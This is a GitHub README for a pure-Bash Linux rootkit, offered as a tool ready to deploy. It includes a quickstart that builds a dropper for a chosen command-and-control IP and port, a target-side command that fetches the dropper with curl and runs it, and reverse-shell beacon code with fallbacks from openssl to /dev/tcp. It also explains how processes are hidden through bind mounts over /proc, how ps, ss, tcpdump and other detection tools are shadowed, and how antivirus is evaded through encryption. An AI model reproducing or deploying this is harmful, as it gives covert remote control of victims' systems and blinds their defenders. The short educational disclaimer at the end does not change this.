# bash-rootkit

> Living off the land: a pure-Bash userland rootkit — no compiled binaries, no kernel modules.
> Persists as an encrypted reverse-shell beacon, hides its own PID, and shadows common system
> commands to blind the defender using only tools already on the box.

![Bash](https://img.shields.io/badge/Bash-4EAA25?style=for-the-badge&logo=gnubash&logoColor=white)
![Linux](https://img.shields.io/badge/Linux-FCC624?style=for-the-badge&logo=linux&logoColor=black)
![Security](https://img.shields.io/badge/Offensive_Security-ED1C24?style=for-the-badge&logo=kalilinux&logoColor=white)
![License](https://img.shields.io/badge/Educational_Only-blue?style=for-the-badge)

**[🌐 Full Visual README](https://JamesRiversTech.github.io/bash-rootkit)** &nbsp;·&nbsp;
**[💼 LinkedIn](https://www.linkedin.com/in/james-rivers-tech)** &nbsp;·&nbsp;
**[🔗 jamesrivers.tech](https://jamesrivers.tech/)**

---

## 📖 Overview

A fully self-contained userland rootkit written in pure Bash — no compiled code, no kernel
exploits. Everything runs using tools already present on a stock Linux system. Pure living
off the land.

The project has three layers:

| Layer | File | Purpose |
|-------|------|---------|
| 🔴 Beacon | `real_beacon` | Persistent reverse shell with PID hiding |
| 🟡 Functions | `final_functions` | Shadow functions that masquerade as real Linux commands |
| 🟢 Obfuscation | `bincrypter` + `function_obfuscater.sh` | Encrypts beacon for in-memory execution, obfuscates functions |

---

## 🚀 Quickstart

```bash
git clone https://github.com/JamesRiversTech/bash-rootkit
cd bash-rootkit
chmod +x setup.sh function_obfuscater.sh bincrypter.sh
./setup.sh
```

`setup.sh` will prompt you for a C2 IP and port, then handle everything automatically —
patching, obfuscating, encrypting, and producing a ready-to-serve `dropper.sh`.

Then serve and deploy:

```bash
python -m http.server 8080

# on the target:
curl <your-ip>:8080/dropper.sh -O && bash dropper.sh
```

---

## 🏗️ What setup.sh Does

Three steps, fully automated:

1. **Patches** your IP, port, and persistence path into the template files
2. **Obfuscates** the shadow functions via `function_obfuscater.sh` — hex-encoded into
   shuffled MD5-length variable chunks, injected into `dropper.sh`
3. **Encrypts** the beacon via THC Bincrypter, base64-encodes it, and injects it into
   `dropper.sh`

The result is a single `dropper.sh` — the shadow functions are never readable on disk,
and the beacon runs entirely in memory.

---

## 📡 Beacon — `real_beacon`

The core loop. Hides every spawned PID via `mtab()`, uses a randomized named pipe in
`/dev/shm`, and tries each available connection tool in order:

```bash
PIPE="/dev/shm/.cache_$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 8)"
mkfifo "$PIPE"

if command -v openssl >/dev/null 2>&1; then
    ( /bin/bash < $PIPE 2>&1 | openssl s_client -quiet -connect $IP:$PORT > $PIPE ) &
elif command -v socat >/dev/null 2>&1; then
    ( socat OPENSSL:$IP:$PORT,verify=0 EXEC:/bin/bash ) &
elif command -v ncat >/dev/null 2>&1; then
    ( /bin/bash < $PIPE 2>&1 | ncat --ssl $IP $PORT > $PIPE ) &
elif command -v cryptcat >/dev/null 2>&1; then
    ( /bin/bash < $PIPE 2>&1 | cryptcat $IP $PORT > $PIPE ) &
elif command -v nc >/dev/null 2>&1; then
    ( cat $PIPE | /bin/bash 2>&1 | nc $IP $PORT > $PIPE ) &
else
    ( /bin/bash >& /dev/tcp/$IP/$PORT 0>&1 ) &
fi

pid=$!
pids="$pid $(pgrep -P $pid)"
for i in $pids; do mtab $i; done
```

Fallback chain: openssl (TLS) → socat (TLS) → ncat (TLS) → cryptcat → nc → `/dev/tcp`.
Works on almost any stock Linux system without extra packages.

Cleanup is handled via `trap` on `EXIT` / `SIGINT` / `SIGTERM` — unmounting all `/dev/shm`
bind-mounts and killing background jobs on demand.

### PID Hiding — `mtab()`

1. Converts `/etc/mtab` from symlink to real file (prevents mount logging via `-n` flag)
2. Creates a chmod 555 empty directory at `/dev/shm/.cache_main`
3. Bind-mounts it over `/proc/<PID>` — process invisible to `ls /proc`, `ps`, and friends

---

## 🪞 Command Shadowing — `final_functions`

Every common detection tool is overridden with a Bash function that calls the real binary
but pipes output through `grep -Ev "$_HG_P"`, stripping any line matching a rootkit
indicator. Tab-completion is preserved via `$COMP_LINE` checks.

The persistence path and C2 port are patched into `_HG_P` by `setup.sh` at build time.

### Shadowed Commands

| Command | Technique | What it hides |
|---------|-----------|---------------|
| `busybox` | Subcmd router | Routes all subcommands through hooked functions, defeating busybox-as-clean-binary bypass |
| `ls` | Bash fn + `-I` flags | Hidden files & empty `/proc` entries for masked PIDs |
| `ps` / `pgrep` / `top` / `htop` | Mounted over by `mtab()` | Rootkit processes |
| `grep` / `head` / `tail` / `cat` | Pipe through `grep -Ev $_HG_P` | Any line containing rootkit indicators |
| `mount` / `findmnt` | Output filter | `/proc` and `/dev/shm` bind-mounts |
| `tcpdump` | Auto-inject BPF filter | C2 port from all captures |
| `ss` / `netstat` | Pattern-filtered output | C2 port connection |
| `lsof` / `strace` | Pattern-filtered output | Open FDs and syscalls related to the beacon |
| `set` / `declare` / `typeset` | AWK block-skip parser | Shadow function definitions from variable dumps |
| `env` / `printenv` / `export` | AWK + grep filter | `_HG_P` var & `BASH_FUNC_*` exports |
| `type` / `which` | Hardcoded case statements | Returns fake binary paths for shadowed commands |
| `unset` / `builtin` | Guard wrapper | Silently fails if called against any hooked function |

Absolute path calls (e.g. `/usr/bin/grep`) are also intercepted — at load time each
tool's full path is registered as a function too. `_HIDDEN_FUNC_PATTERN` is built
dynamically using `command which` so paths are correct on any target system.

---

## 🔒 Obfuscation — THC Bincrypter

[THC's Bincrypter](https://github.com/hackerschoice/bincrypter):

- **Unreadable at rest** — `strings`, `cat`, `file` reveal nothing useful
- **In-memory execution** — self-decrypts at runtime, no cleartext ever touches disk
- **Morphing** — different signature on every run, defeating static AV signatures

---

## 🧪 Tested On

| System | Result |
|--------|--------|
| Kali Linux (local VM) | ✅ Hidden from `ps`, `top`, `htop`, `ss`, `netstat`, `tcpdump` |
| CentOS 7 | ✅ All three layers confirmed working |
| rkhunter 1.4.6 | ✅ Not detected on either system |

---

## ⚠️ Disclaimer

This project is shared strictly for **educational and research purposes**. Understanding
offensive techniques is essential for building robust defences. Do not deploy this on any
system you do not own or have explicit written permission to test. The author assumes no
liability for misuse.

---

<div align="center">

Made by **[James Rivers](https://jamesrivers.tech/)** &nbsp;·&nbsp; [LinkedIn](https://www.linkedin.com/in/james-rivers-tech)

</div>
